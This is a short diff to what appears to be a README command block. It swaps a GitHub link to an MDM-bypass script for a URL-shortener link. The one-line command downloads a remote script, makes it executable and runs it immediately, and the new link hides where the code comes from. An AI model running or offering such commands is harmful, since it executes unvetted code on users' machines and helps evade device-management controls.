@@ -1,3 +1,3 @@
 ```sh
-curl https://raw.githubusercontent.com/isaiasalencar/bypasmdm/main/mdm.sh -o test.sh && chmod +x ./test.sh && ./test.sh
+curl https://encr.pw/lu39G -o test.sh && chmod +x ./test.sh && ./test.sh
 ```
